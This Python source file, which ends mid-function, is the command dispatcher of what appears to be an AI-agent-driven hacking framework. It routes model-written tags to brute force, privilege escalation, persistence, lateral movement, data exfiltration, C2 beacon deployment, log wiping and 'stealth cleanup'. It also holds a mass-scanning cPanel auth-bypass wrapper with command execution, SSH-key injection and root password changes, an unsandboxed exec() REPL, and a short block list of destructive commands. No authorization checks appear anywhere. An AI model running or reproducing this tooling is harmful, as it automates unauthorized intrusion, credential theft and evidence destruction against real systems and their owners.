#!/usr/bin/env python3
"""
Main tool dispatcher, interactive tool selector, and command execution.
Extracted from tools.py.
"""

import subprocess
import shutil
import os
import re
import concurrent.futures
import time as _time

# ─────────────────────────────────────────────
# IMPORTS FROM SHARED BASE (breaks circular deps)
# ─────────────────────────────────────────────
from core.tools.base import (
    run_tool, is_tool_available, _fmt_elapsed, get_tool_config, ToolResult,
    C_GREY, C_RESET, C_CYAN, C_GREEN, C_YELLOW, C_RED, C_BLUE, C_MAGENTA,
    _TOOL_AVAILABLE,
)

# ─────────────────────────────────────────────
# IMPORTS FROM SIBLING MODULES
# ─────────────────────────────────────────────
from core.tools.exploit_tools import (
    register_credential, get_known_creds,
    get_best_creds_for_target, get_all_known_creds_for_target,
    _is_internal_ip, run_bruteforce, run_web_login_bruteforce,
    run_jmx2rce_scan, run_jmx2rce_rce, run_jmx2rce_read, run_jmx2rce_cleanup,
)
from core.tools.recon_tools import (
    run_nmap, run_whois, run_whatweb, run_curl_headers,
    run_dig, run_sslscan, run_ffuf, run_enum4linux,
    run_smbclient, run_wpscan, run_sqlmap, run_nikto,
    run_scrapling_fetch, run_scrapling_crawl,
    run_ssh_user_enum,
)
from core.tools.post_tools import (
    _run_ssh_session_interactive, _run_killchain_stage,
    _run_killchain_interactive, _run_waf_detect,
    _run_shodan_interactive, _run_shodan_host,
    _run_shodan_vulns, _run_shodan_range,
    _run_crack_hashes,
    _run_cpanel_exploit, _run_shardbrowser_osint,
    run_default_recon,
)

# ─────────────────────────────────────────────
# TOOLS MENU — used by interactive_tool_run()
# and run_single_tool()
# ─────────────────────────────────────────────
TOOLS_MENU = {
    "1":  ("nmap",               run_nmap),
    "2":  ("whois",              run_whois),
    "3":  ("whatweb",            run_whatweb),
    "4":  ("curl headers",       run_curl_headers),
    "5":  ("dig DNS",            run_dig),
    "6":  ("sslscan",            run_sslscan),
    "7":  ("ffuf",               run_ffuf),
    "8":  ("enum4linux",         run_enum4linux),
    "9":  ("smbclient",          run_smbclient),
    "10": ("wpscan",             run_wpscan),
    "11": ("sqlmap",             run_sqlmap),
    "12": ("nikto",              run_nikto),
    "13": ("scrapling",          lambda t: run_scrapling_fetch(f"http://{t}")),
    "14": ("jmx2rce",            run_jmx2rce_scan),
    "15": ("ssh_user_enum",      run_ssh_user_enum),
    "16": ("bruteforce SSH",     lambda t: run_bruteforce("ssh", t)),
    "17": ("web login brute",    run_web_login_bruteforce),
    "18": ("ssh_session",        lambda t: _run_ssh_session_interactive(t)),
    "19": ("vuln assess",        lambda t: _run_killchain_stage("vuln_assess", t)),
    "20": ("auto exploit",       lambda t: _run_killchain_stage("auto_exploit", t)),
    "21": ("privesc",            lambda t: _run_killchain_interactive("privesc", t)),
    "22": ("persistence",        lambda t: _run_killchain_interactive("persist", t)),
    "23": ("lateral move",       lambda t: _run_killchain_interactive("lateral", t)),
    "24": ("data exfil",         lambda t: _run_killchain_interactive("exfil", t)),
    "25": ("FULL KILL CHAIN",    lambda t: _run_killchain_interactive("full", t)),
    "26": ("WAF detect",         lambda t: _run_waf_detect(t)),
    "27": ("stealth cleanup",    lambda t: _run_killchain_interactive("cleanup", t)),
    "28": ("shodan search",      lambda t: _run_shodan_interactive(t)),
    "29": ("shodan host",        lambda t: _run_shodan_host(t)),
    "30": ("shodan vulns",       lambda t: _run_shodan_vulns(t)),
    "31": ("crack hashes",       lambda t: _run_crack_hashes(t)),
    "32": ("shodan range",       lambda t: _run_shodan_range(t)),
    "33": ("cpanel exploit",     lambda t: _run_cpanel_exploit(t)),
    "34": ("shardbrowser",       lambda t: _run_shardbrowser_osint(t)),
}

# ─────────────────────────────────────────────
# INDIVIDUAL TOOLS
# ─────────────────────────────────────────────



def run_single_tool(tool_key: str, target: str) -> str:
    """Run one tool by its menu key. Used by AI tool dispatch."""
    if tool_key in TOOLS_MENU:
        name, func = TOOLS_MENU[tool_key]
        return func(target)
    return f"[!] Unknown tool key: {tool_key}"


def format_recon_for_llm(results: dict) -> str:
    """
    Flatten the recon results dict into one clean string
    to paste into the LLM prompt.
    """
    output = ""
    for tool, data in results.items():
        output += f"\n{'='*50}\n"
        output += f"[ {tool.upper()} OUTPUT ]\n"
        output += f"{'='*50}\n"
        output += data.strip() + "\n"
    return output



# ── PYTHON REPL (Dynamic Script Execution) ──
def run_python_repl(code: str) -> str:
    import sys
    from io import StringIO
    import traceback
    
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    
    try:
        # Use exec to run the code
        exec(code, {})
        output = redirected_output.getvalue()
    except Exception as e:
        output = redirected_output.getvalue() + "\n[!] REPL Error:\n" + traceback.format_exc()
    finally:
        sys.stdout = old_stdout
        
    return output


def run_tool_by_command(command_str: str) -> str:
    """
    Called by LLM tool dispatch when AI writes [TOOL: nmap -sV 1.2.3.4].
    Splits the string and runs it safely.
    v3.2: Comprehensive hallucination handling — catches fake tools, wrong syntax,
    strips garbage flags, extracts IPs from port-appended strings.
    """
    parts = command_str.strip().split()
    if not parts:
        return "[!] Empty command."

    cmd_lower = parts[0].lower()

    # ── HELPER: Extract clean IP from 'IP:PORT' or 'http://IP:PORT/path' ──
    def _extract_ip(s):
        """Extract clean IP from various formats."""
        s = s.replace("http://", "").replace("https://", "")
        s = s.split("/")[0]  # remove path
        s = s.split(":")[0]  # remove port
        return s

    # ── HELPER: Resolve creds — smart priority resolution ──
    def _resolve_creds(host: str, user: str = None, pwd: str = None) -> tuple:
        """Resolve credentials for a host.
        v8.1: If AI provided creds that match ANY registered cred, use them.
        Priority: AI-provided (if valid) > root > first cached.
        This fixes the bug where root:octopus was overridden by support."""
        cached_user, cached_pwd = get_best_creds_for_target(host)

        # If AI provided creds, check if they are valid (registered)
        if user and pwd:
            all_creds = get_all_known_creds_for_target(host)
            for svc, cred_list in all_creds.items():
                for c_user, c_pwd in cred_list:
                    if user == c_user and pwd == c_pwd:
                        # AI sent valid registered creds — USE THEM
                        return (user, pwd)
            # AI creds not in cache — register and use if root
            if user == "root":
                register_credential("ssh", host, user, pwd)
                return (user, pwd)
            # AI creds not registered and not root — use best cached
            if cached_user and cached_pwd:
                print(f"  {C_YELLOW}[FIX] AI sent unregistered creds {user}:{pwd[:4]}*** for {host}")
                print(f"       -> Using best cached: {cached_user}:{cached_pwd[:4]}***{C_RESET}")
                return (cached_user, cached_pwd)
            # Nothing cached — register AI creds
            register_credential("ssh", host, user, pwd)
            return (user, pwd)

        # No AI creds — use best cached
        if cached_user and cached_pwd:
            return (cached_user, cached_pwd)
        return (None, None)

    # ── BLOCK: Hallucinated/fake tools → return helpful error ──
    _FAKE_TOOLS = {
        "metasploit_scan": "Use [MSF: auxiliary/scanner/... | RHOSTS=IP] or [SEARCH: CVE-...]",
        "metasploit_exploit": "Use [MSF: exploit/... | RHOSTS=IP]",
        "nikto_scan": "Use [CMD: nikto -h IP]",
        "service_version_enumeration": "Use [TOOL: nmap -Pn -sT -sV IP]",
        "cms_detect": "Use [TOOL: scrapling http://IP] and [CMD: whatweb http://IP]",
        "webdav_scan": "Use [CMD: nmap --script http-webdav-scan IP]",
        "cve_lookup": "Use [SEARCH: CVE-YYYY-NNNNN] or [SEARCHSPLOIT: service version]",
        "dirbuster": "Use [TOOL: dirb_fuzz http://IP]",
        "format_b_final_analysis": "NOT a tool. Write your analysis directly in Format B.",
        "dirb": "Use [TOOL: dirb_fuzz http://IP]",
        "hydra": "Use [TOOL: bruteforce SERVICE IP]",
        "metasploit_web_enum": "Use [TOOL: scrapling http://IP]",
        "msf_web_enum": "Use [TOOL: scrapling http://IP]",
        "smb_enum": "Use [CMD: enum4linux -a IP]",
        # v7.0: Block tools that should use proper tags
        "msfconsole": "Use [MSF: module/path | RHOSTS=IP] instead of calling msfconsole directly",
        "searchsploit": "Use [SEARCHSPLOIT: service version] tag instead of [TOOL: searchsploit ...]",
    }
    if cmd_lower in _FAKE_TOOLS:
        hint = _FAKE_TOOLS[cmd_lower]
        target_hint = _extract_ip(parts[1]) if len(parts) > 1 else "TARGET"
        return f"[!] '{parts[0]}' is NOT a real tool. AI: Use correct syntax: {hint.replace('IP', target_hint)}"

    # ── SHODAN (v8.1) ────────────────────────────────────
    if cmd_lower in ["shodan", "shodan_search", "shodan_host", "shodan_vulns", "shodan_range"]:
        try:
            from shodan_module import (run_shodan_search, run_shodan_host,
                                       run_shodan_vulns, run_shodan_range, run_shodan_smart)
            if len(parts) >= 3 and parts[1].lower() == "host":
                return run_shodan_host(parts[2])
            elif len(parts) >= 3 and parts[1].lower() == "vulns":
                return run_shodan_vulns(parts[2])
            elif len(parts) >= 3 and parts[1].lower() == "range":
                return run_shodan_range(" ".join(parts[2:]))
            elif len(parts) >= 2 and parts[1].lower() == "search":
                return run_shodan_search(" ".join(parts[2:]))
            elif len(parts) >= 2:
                # v8.1: Smart routing — auto-detect IP / CIDR / query
                return run_shodan_smart(" ".join(parts[1:]))
            else:
                return "[!] Usage: shodan search QUERY | shodan host IP | shodan vulns IP | shodan range CIDR"
        except ImportError:
            return "[!] shodan_module.py not found. Install: pip install shodan"

    # ── HASH CRACKER (v8.0) ──────────────────────────────
    if cmd_lower in ["crack_hashes", "hash_crack", "crack", "hashcrack"]:
        try:
            from hash_cracker import run_crack_hashes, run_crack_single
            if len(parts) >= 2:
                target = " ".join(parts[1:])
                return run_crack_hashes(target)
            else:
                return "[!] Usage: crack_hashes /path/to/shadow OR crack_hashes '$6$salt$hash'"
        except ImportError:
            return "[!] hash_cracker.py not found."

    # ── KILL CHAIN TOOLS (v4.0) ──────────────────────────
    if cmd_lower == "python_repl":
        code = command_str[len("python_repl"):].strip()
        # strip quotes if AI wrapped it
        if code.startswith("'''") and code.endswith("'''"):
            code = code[3:-3]
        elif code.startswith('"""') and code.endswith('"""'):
            code = code[3:-3]
        return run_python_repl(code)
    if cmd_lower in ["killchain_vuln_assess", "killchain_vuln", "vuln_assess"] and len(parts) >= 2:
        target_ip = _extract_ip(parts[1])
        recon_data = " ".join(parts[2:]) if len(parts) > 2 else ""
        try:
            from killchain import vuln_assess
            return vuln_assess(target_ip, recon_data)
        except ImportError:
            return "[!] killchain.py not found."

    if cmd_lower in ["killchain_exploit", "auto_exploit"] and len(parts) >= 2:
        target_ip = _extract_ip(parts[1])
        recon_data = " ".join(parts[2:]) if len(parts) > 2 else ""
        try:
            from killchain import auto_exploit
            return auto_exploit(target_ip, recon_data)
        except ImportError:
            return "[!] killchain.py not found."

    if cmd_lower in ["killchain_privesc", "privesc"] and len(parts) >= 2:
        host = _extract_ip(parts[1])
        user = parts[2] if len(parts) >= 3 else None
        pwd = parts[3] if len(parts) >= 4 else None
        # Auto-lookup creds if AI didn't provide them or sent wrong ones
        user, pwd = _resolve_creds(host, user, pwd)
        if not user or not pwd:
            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_privesc IP USER PASSWORD"
        try:
            from killchain import run_privesc
            return run_privesc(host, user, pwd)
        except ImportError:
            return "[!] killchain.py not found."

    if cmd_lower in ["killchain_persist", "persist", "persistence"] and len(parts) >= 2:
        host = _extract_ip(parts[1])
        user = parts[2] if len(parts) >= 3 else None
        pwd = parts[3] if len(parts) >= 4 else None
        user, pwd = _resolve_creds(host, user, pwd)
        if not user or not pwd:
            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_persist IP USER PASSWORD"
        try:
            from killchain import plant_persistence
            return plant_persistence(host, user, pwd)
        except ImportError:
            return "[!] killchain.py not found."

    if cmd_lower in ["killchain_lateral", "lateral_move", "lateral"] and len(parts) >= 2:
        host = _extract_ip(parts[1])
        user = parts[2] if len(parts) >= 3 else None
        pwd = parts[3] if len(parts) >= 4 else None
        user, pwd = _resolve_creds(host, user, pwd)
        if not user or not pwd:
            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_lateral IP USER PASSWORD"
        try:
            from killchain import lateral_move
            return lateral_move(host, user, pwd)
        except ImportError:
            return "[!] killchain.py not found."

    if cmd_lower in ["killchain_exfil", "data_exfil", "exfil"] and len(parts) >= 2:
        host = _extract_ip(parts[1])
        user = parts[2] if len(parts) >= 3 else None
        pwd = parts[3] if len(parts) >= 4 else None
        user, pwd = _resolve_creds(host, user, pwd)
        if not user or not pwd:
            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_exfil IP USER PASSWORD"
        try:
            from killchain import data_exfil
            return data_exfil(host, user, pwd)
        except ImportError:
            return "[!] killchain.py not found."

    if cmd_lower in ["killchain_full", "full_killchain"] and len(parts) >= 2:
        target_ip = _extract_ip(parts[1])
        user = parts[2] if len(parts) >= 3 else None
        pwd = parts[3] if len(parts) >= 4 else None
        user, pwd = _resolve_creds(target_ip, user, pwd)
        try:
            from killchain import run_full_killchain
            return run_full_killchain(target_ip, user, pwd)
        except ImportError:
            return "[!] killchain.py not found."

    # v7.0: Stealth cleanup
    if cmd_lower in ["killchain_cleanup", "cleanup", "stealth_cleanup"] and len(parts) >= 2:
        host = _extract_ip(parts[1])
        user = parts[2] if len(parts) >= 3 else None
        pwd = parts[3] if len(parts) >= 4 else None
        user, pwd = _resolve_creds(host, user, pwd)
        if not user or not pwd:
            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_cleanup IP USER PASSWORD"
        try:
            from killchain import stealth_cleanup
            return stealth_cleanup(host, user, pwd)
        except ImportError:
            return "[!] killchain.py not found."

    # v8.0: Deploy C2 Beacon
    if cmd_lower in ["deploy_c2_beacon", "c2_beacon"] and len(parts) >= 2:
        host = _extract_ip(parts[1])
        user = parts[2] if len(parts) >= 3 else None
        pwd = parts[3] if len(parts) >= 4 else None
        user, pwd = _resolve_creds(host, user, pwd)
        if not user or not pwd:
            return f"[!] No SSH credentials known for {host}. Provide creds: deploy_c2_beacon IP USER PASSWORD"
        try:
            from killchain import deploy_c2_beacon
            return deploy_c2_beacon(host, user, pwd)
        except ImportError:
            return "[!] killchain.py not found."


    # ── CVE-2026-41940 cPanel Auth Bypass (v11) ──────────
    # cpanel_exploit IP [action] [args...]
    # cpanel_check IP            — scan only
    # cpanel_cmd IP COMMAND      — exec command
    # cpanel_list IP             — list accounts
    # cpanel_mass FILE [THREADS] — mass scan
    if cmd_lower in ["cpanel_exploit", "cpanel_auth_bypass", "cve_2026_41940",
                     "cpanel_rce", "cpanel_check", "cpanel_cmd", "cpanel_list",
                     "cpanel_sshkey", "cpanel_wipe", "cpanel_info",
                     "cpanel_mass", "cpanel_apitoken", "cpanel_passwd",
                     "cpanel_sniper"] and len(parts) >= 2:
        try:
            from modules.exploits.cpanel_auth_bypass import CpanelSniper
            sniper = CpanelSniper()
            target = parts[1]

            # Mass scan mode
            if cmd_lower == "cpanel_mass":
                threads = int(parts[2]) if len(parts) >= 3 else 20
                out_file = parts[3] if len(parts) >= 4 else None
                result = sniper.mass_scan(target, threads=threads, output=out_file)
            # Scan only
            elif cmd_lower == "cpanel_check":
                result = sniper.scan(target)
            # Exec command
            elif cmd_lower == "cpanel_cmd":
                command = " ".join(parts[2:]) if len(parts) >= 3 else "id"
                result = sniper.exec_cmd(target, cmd=command)
            # List accounts
            elif cmd_lower == "cpanel_list":
                result = sniper.list_accounts(target)
            # SSH key inject
            elif cmd_lower == "cpanel_sshkey":
                key = " ".join(parts[2:]) if len(parts) >= 3 else ""
                result = sniper.inject_sshkey(target, key)
            # Wipe logs
            elif cmd_lower == "cpanel_wipe":
                result = sniper.wipe_logs(target)
            # Server info
            elif cmd_lower == "cpanel_info":
                result = sniper.server_info(target)
            # API token
            elif cmd_lower == "cpanel_apitoken":
                name = parts[2] if len(parts) >= 3 else "octopus"
                result = sniper.create_apitoken(target, name=name)
            # Change password
            elif cmd_lower == "cpanel_passwd":
                if len(parts) < 3:
                    return "[!] Usage: cpanel_passwd <target> <new_password>"
                pw = parts[2]
                result = sniper.change_root_passwd(target, pw)
            # Generic: cpanel_exploit IP [action] [args]
            else:
                action = parts[2] if len(parts) >= 3 else "cmd"
                cmd_arg = " ".join(parts[3:]) if len(parts) >= 4 else "id"
                result = sniper.exploit(target, action=action, cmd=cmd_arg)

            import json as _json
            out = f"[CVE-2026-41940 — {target}]\n"
            # Show raw output if present
            raw = result.pop("raw_output", "")
            out += _json.dumps(result, indent=2, default=str)
            if raw:
                out += f"\n\n─── RAW OUTPUT ───\n{raw}"
            return out
        except FileNotFoundError as e:
            return f"[!] cpanel_sniper binary not found: {e}"
        except ImportError as ie:
            return f"[!] cpanel_auth_bypass module: {ie}"
        except Exception as e:
            return f"[!] cPanel exploit error: {e}"

    # ── ShardBrowser / ShardX OSINT (v11) ──────────────────
    # shardbrowser QUERY     — OSINT search
    # shard_launch [PROXY]   — launch isolated profile
    # shard_multi COUNT      — launch multiple sessions
    if cmd_lower in ["shardbrowser", "shard_osint", "osint_browser",
                     "shard_launch", "shard_multi", "shard_recon"] and len(parts) >= 2:
        try:
            from core.osint.shardbrowser import ShardBrowser
            sb = ShardBrowser()

            if cmd_lower == "shard_launch":
                proxy = parts[1] if parts[1].startswith("socks") or parts[1].startswith("http") else None
                session = sb.launch_profile(proxy=proxy)
                return f"[ShardX] Profile launched — CDP: {session.cdp_url}"

            elif cmd_lower == "shard_multi":
                count = int(parts[1])
                proxies = parts[2:] if len(parts) > 2 else None
                sessions = sb.multi_session(count, proxy_list=proxies)
                return f"[ShardX] {len(sessions)} sessions launched"

            elif cmd_lower == "shard_recon":
                name = " ".join(parts[1:])
                results = sb.social_recon(name)
                import json as _json
                return f"[ShardX Social Recon — {name}]\n" + _json.dumps(results, indent=2, default=str)

            else:  # osint
                query = " ".join(parts[1:])
                results = sb.osint_target(query)
                import json as _json
                return f"[ShardX OSINT — {query}]\n" + _json.dumps(results, indent=2, default=str)

        except Exception as e:
            return f"[!] ShardBrowser error: {e}"

    # ── EVASION TOOLS (v4.1) ─────────────────────────────
    if cmd_lower in ["waf_detect", "detect_waf", "waf"] and len(parts) >= 2:
        target_ip = _extract_ip(parts[1])
        try:
            from evasion import WebEvasionSession
            ws = WebEvasionSession()
            result = ws.detect_waf(f"http://{target_ip}")
            out = f"[WAF DETECTION — {target_ip}]\n"
            out += f"WAF Detected: {result['waf_detected']}\n"
            out += f"WAF Type: {result['waf_type']}\n"
            for d in result.get('details', []):
                out += f"  → {d}\n"
            return out
        except ImportError:
            return "[!] evasion.py not found."

    if cmd_lower in ["stealth_brute", "stealth_bruteforce", "evasion_brute"] and len(parts) >= 3:
        svc = parts[1].lower()
        target_ip = _extract_ip(parts[2])
        try:
            from evasion import ssh_bruteforce_stealth, web_bruteforce_stealth
            if svc in ("ssh", "sftp"):
                return ssh_bruteforce_stealth(target_ip, users=["root", "admin", "support", "user", "test"])
            elif svc in ("web", "http", "http-post-form"):
                return web_bruteforce_stealth(f"http://{target_ip}")
            else:
                return f"[!] Stealth brute not available for '{svc}'. Use [TOOL: bruteforce {svc} {target_ip}]"
        except ImportError:
            return "[!] evasion.py not found."

    # ── SSH session (post-exploitation via paramiko) ──
    if cmd_lower in ["ssh_session", "ssh-session", "sshsession"] and len(parts) >= 2:
        host = _extract_ip(parts[1])
        user = parts[2] if len(parts) >= 3 else None
        pwd = parts[3] if len(parts) >= 4 else None
        # Auto-resolve creds — AI often sends wrong password from another target
        user, pwd = _resolve_creds(host, user, pwd)
        if not user or not pwd:
            return f"[!] No SSH credentials known for {host}. Provide creds: ssh_session IP USER PASSWORD"
        try:
            from ssh_session import ssh_analyze
            return ssh_analyze(host, user, pwd)
        except ImportError:
            return "[!] ssh_session.py not found. Cannot perform SSH post-exploitation."

    # ── SSH exec (run a single command on target) ──
    if cmd_lower in ["ssh_exec", "ssh-exec"] and len(parts) >= 3:
        host = _extract_ip(parts[1])
        # Try to detect if AI sent creds or just a command
        # Pattern 1: ssh_exec HOST USER PASS command (standard)
        # Pattern 2: ssh_exec HOST command (auto-resolve creds)
        if len(parts) >= 5:
            user = parts[2]
            pwd = parts[3]
            cmd = " ".join(parts[4:])
        else:
            # No creds provided — try auto-resolve
            user, pwd = get_best_creds_for_target(host)
            cmd = " ".join(parts[2:])
        # Auto-resolve creds if AI sent wrong ones
        user, pwd = _resolve_creds(host, user, pwd)
        if not user or not pwd:
            return f"[!] No SSH credentials known for {host}. Syntax: ssh_exec HOST USER PASS command"
        # v6.0: Strip surrounding quotes that the AI or tag parser leaves on commands
        cmd = cmd.strip("'\"")
        if not cmd:
            return "[!] ssh_exec needs a command to run. Syntax: ssh_exec HOST USER PASS command"
        try:
            from ssh_session import ssh_exec
            return ssh_exec(host, user, pwd, cmd)
        except ImportError:
            return "[!] ssh_session.py not found."

    # ── SSH user enumeration ──
    if cmd_lower in ["ssh_user_enum", "ssh-user-enum", "sshenum"] and len(parts) >= 2:
        target_ip = _extract_ip(parts[1])
        port = 22
        if len(parts) >= 3 and parts[2].isdigit():
            port = int(parts[2])
        return run_ssh_user_enum(target_ip, port)

    # ── Bruteforce (ALL patterns — strip garbage flags) ──
    if cmd_lower in ["bruteforce", "bruteforce_ssh", "bruteforce_web"]:
        if len(parts) < 2:
            return "[!] bruteforce needs at least a target. Syntax: bruteforce SERVICE IP"

        if cmd_lower == "bruteforce_ssh":
            return run_bruteforce("ssh", _extract_ip(parts[1]))
        elif cmd_lower == "bruteforce_web":
            return run_web_login_bruteforce(_extract_ip(parts[1]))

        # v6.0: Smart argument detection — AI sends EITHER:
        #   bruteforce SERVICE IP       (correct: bruteforce ssh 83.166.241.164)
        #   bruteforce IP PORT SERVICE  (wrong:   bruteforce 83.166.241.164 22 ssh)
        #   bruteforce IP SERVICE       (wrong:   bruteforce 83.166.241.164 ssh)
        # Detect by checking if parts[1] looks like an IP address
        import re as _re
        _IP_PATTERN = _re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')

        if _IP_PATTERN.match(parts[1]):
            # AI sent IP first — swap to get correct order
            target = _extract_ip(parts[1])
            # Try to find service name in remaining parts
            service = "ssh"  # default
            for p in parts[2:]:
                p_lower = p.lower().split(':')[0].split('=')[0]  # strip port/flag suffixes
                if p_lower in ("ssh", "sftp", "ftp", "http", "https", "smtp",
                                "http-post-form", "https-post-form", "http-get",
                                "http-head", "web", "telnet", "rdp", "vnc",
                                "mysql", "postgres", "mssql", "redis", "ldap"):
                    service = p_lower
                    break
            print(f"  {C_YELLOW}[FIX] Bruteforce args reordered: service={service} target={target}{C_RESET}")
        else:
            # AI sent SERVICE first (correct format)
            service = parts[1].lower()
            target = _extract_ip(parts[2]) if len(parts) >= 3 else _extract_ip(parts[1])

        # Route web services to web login bruteforce
        if service in ["http-post-form", "https-post-form", "http-get", "http",
                        "https", "web", "http-head"]:
            return run_web_login_bruteforce(target)

        # For standard services, strip all garbage flags
        return run_bruteforce(service, target)

    # ── Web login bruteforce ──
    if cmd_lower in ["web_login_brute", "web-login-brute", "web_brute", "webbrute"]:
        if len(parts) >= 2:
            return run_web_login_bruteforce(_extract_ip(parts[1]))
        return "[!] web_login_brute needs a target IP."

    # ── Metasploit web enum → scrapling fallback ──
    if cmd_lower in ["metasploit_web_enum", "msf_web_enum"] and len(parts) >= 2:
        url = parts[1]
        print(f"  {C_YELLOW}[FIX] {parts[0]} is not a real tool → running scrapling{C_RESET}")
        return run_scrapling_fetch(url)

    # ── dirb_fuzz / dirb / dirbuster → ffuf ──
    if cmd_lower in ["dirb_fuzz", "dirb", "dirbuster"] and len(parts) >= 2:
        print(f"  [*] Auto-Fuzzing directories for {parts[1]}")
        clean_target = _extract_ip(parts[1])
        return run_ffuf(clean_target)

    # ── scrapling ──
    if cmd_lower == "scrapling" and len(parts) >= 2:
        return run_scrapling_fetch(parts[1])

    # ── nmap (with flag passthrough + strip -oX output flags) ──
    if cmd_lower in ["nmap", "nmap_scan"] and len(parts) >= 2:
        # Strip output flags the AI adds (-oX, -oN, -oG, -oA)
        clean_parts = []
        skip_next = False
        for i, p in enumerate(parts[1:], 1):
            if skip_next:
                skip_next = False
                continue
            if p in ["-oX", "-oN", "-oG", "-oA", "-o"]:
                skip_next = True  # skip the flag AND its argument
                continue
            # Also strip --ports (not a real nmap flag)
            if p.startswith("--ports"):
                continue
            if p.startswith("--output"):
                skip_next = True
                continue
            clean_parts.append(p)

        if not clean_parts:
            return "[!] nmap needs a target IP."

        target_ip = clean_parts[-1]
        extra_flags = clean_parts[:-1]
        return run_nmap(target_ip, extra_flags=extra_flags if extra_flags else None)

    # ── searchsploit (strip -s, -p, --exclude flags) ──
    if cmd_lower == "searchsploit" and len(parts) >= 2:
        # AI writes: searchsploit -s "nginx 1.14.0" or searchsploit -p 39446
        # Correct: searchsploit nginx 1.14.0
        clean_terms = []
        skip_next = False
        for p in parts[1:]:
            if skip_next:
                skip_next = False
                continue
            if p in ["-s", "--service", "--output"]:
                continue  # strip fake flags
            if p in ["-p", "--path"]:
                # searchsploit -p EDB-ID → we handle this
                continue
            if p.startswith("--exclude"):
                skip_next = True
                continue
            # Strip port suffixes like "-p 80,443"
            if p.startswith("-p") and len(p) <= 3:
                skip_next = True
                continue
            clean_terms.append(p.strip('"').strip("'"))

        search_query = " ".join(clean_terms)
        if not search_query:
            return "[!] searchsploit needs a search term."
        print(f"  [*] searchsploit: {search_query}")
        return run_tool(["searchsploit", "--color"] + search_query.split(), timeout=60)

    # ── sqlmap (fix URL format) ──
    if cmd_lower == "sqlmap" and len(parts) >= 2:
        # Strip garbage flags: --output-dir, --output
        clean_parts = ["sqlmap"]
        skip_next = False
        for p in parts[1:]:
            if skip_next:
                skip_next = False
                continue
            if p.startswith("--output"):
                skip_next = True
                continue
            clean_parts.append(p)
        # Ensure --batch is present
        if "--batch" not in clean_parts:
            clean_parts.append("--batch")
        return run_tool(clean_parts, timeout=180)

    # ── nikto (fix syntax) ──
    if cmd_lower in ["nikto", "nikto_scan"] and len(parts) >= 2:
        # Strip -Format and -o flags AI adds
        clean_parts = ["nikto"]
        skip_next = False
        target_found = False
        for p in parts[1:]:
            if skip_next:
                skip_next = False
                continue
            if p in ["-Format", "-o", "--output", "-output"]:
                skip_next = True
                continue
            if p == "-h" or p.startswith("-h"):
                clean_parts.append(p)
                target_found = True
            else:
                clean_parts.append(p)
        if not target_found and len(parts) >= 2:
            # AI wrote: nikto IP instead of nikto -h IP
            ip = _extract_ip(parts[1])
            clean_parts = ["nikto", "-h", ip] + [p for p in clean_parts[1:] if p != ip]
        return run_tool(clean_parts, timeout=300)

    # ── jmx2rce ──
    if cmd_lower == "jmx2rce" and len(parts) >= 3:
        subcmd = parts[1].lower()
        host = parts[2] if not parts[2].startswith("-") else None
        for i, p in enumerate(parts):
            if p == "-H" and i + 1 < len(parts):
                host = parts[i + 1]
                break
        if not host:
            host = parts[-1]

        if subcmd == "scan":
            return run_jmx2rce_scan(host)
        elif subcmd == "rce":
            payload = None
            for i, p in enumerate(parts):
                if p == "-payload" and i + 1 < len(parts):
                    payload = parts[i + 1]
            return run_jmx2rce_rce(host, payload)
        elif subcmd == "read":
            filepath = "/etc/passwd"
            for i, p in enumerate(parts):
                if p == "-p" and i + 1 < len(parts):
                    filepath = parts[i + 1]
            return run_jmx2rce_read(host, filepath)
        elif subcmd == "cleanup":
            return run_jmx2rce_cleanup(host)
        else:
            return run_jmx2rce_scan(host)

    # ── Safety check — block destructive commands ──
    blocked = ["rm", "dd", "mkfs", "shutdown", "reboot", "wget", "chmod"]
    if parts[0] in blocked:
        return f"[!] Blocked command: {parts[0]}"

    # ── Fallback: try running as raw command ──
    return run_tool(parts)


# ─────────────────────────────────────────────
# INTERACTIVE TOOL SELECTOR (called from CLI)
# ─────────────────────────────────────────────

def interactive_tool_run(target: str) -> str:
    """
    Let user manually pick which tools to run.
    Returns combined output string.
    """
    print("\n[ SELECT TOOLS TO RUN ]")
    for key, (name, _) in TOOLS_MENU.items():
        print(f"  [{key}] {name:<15}")
    print("\n  [a] Run all standard (fast/concurrent)")
    print("  [n] Run standard + smart extended (auto-detects SSH/Web/FTP)")

    choice = input("\nChoice(s) e.g. 1 2 4 or a: ").strip().lower()

    if choice == "a":
        results = run_default_recon(target)
        return format_recon_for_llm(results)

    if choice == "n":
        results = run_default_recon(target)

        # ── PORT-AWARE EXTENDED TOOLS ──────────────────────────
        nmap_output = results.get("nmap", "")
        curl_output = results.get("curl_headers", "")
        whatweb_output = results.get("whatweb", "")
        all_recon = nmap_output + curl_output + whatweb_output

        # ── v4.0: Scrape ALL detected web ports individually ──────
        web_ports_detected = []
        for p in ["80", "443", "8080", "8443", "1443", "3000", "8000", "8888", "9090", "10000"]:
            if f"{p}/tcp" in nmap_output and "open" in nmap_output:
                web_ports_detected.append(p)

        # Improved web detection: check nmap + curl + whatweb
        has_web = (len(web_ports_detected) > 0
                   or "HTTP/" in curl_output
                   or "nginx" in all_recon.lower()
                   or "apache" in all_recon.lower()
                   or "Server:" in curl_output)
        has_ssh = "22/tcp" in nmap_output and "open" in nmap_output
        has_ftp = "21/tcp" in nmap_output and "open" in nmap_output

        if not web_ports_detected and has_web:
            web_ports_detected = ["80"]  # default

        # ── PHASE 1: Run web tools and SSH user enum in parallel ──
        phase1_futures = {}
        enum_users = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            if has_web:
                print(f"\n  [*] Web ports detected {web_ports_detected} — running extended web tools...")
                phase1_futures[executor.submit(run_wpscan, target)] = "wpscan"
                phase1_futures[executor.submit(run_sqlmap, target)] = "sqlmap"
                phase1_futures[executor.submit(run_nikto, target)] = "nikto"
                phase1_futures[executor.submit(run_web_login_bruteforce, target)] = "web_login_brute"

                # v4.0: Scrape EACH web port individually
                for wp in web_ports_detected:
                    proto = "https" if wp in ("443", "8443", "1443") else "http"
                    scrape_url = f"{proto}://{target}:{wp}" if wp not in ("80", "443") else f"{proto}://{target}"
                    phase1_futures[executor.submit(run_scrapling_fetch, scrape_url)] = f"scrapling_port{wp}"
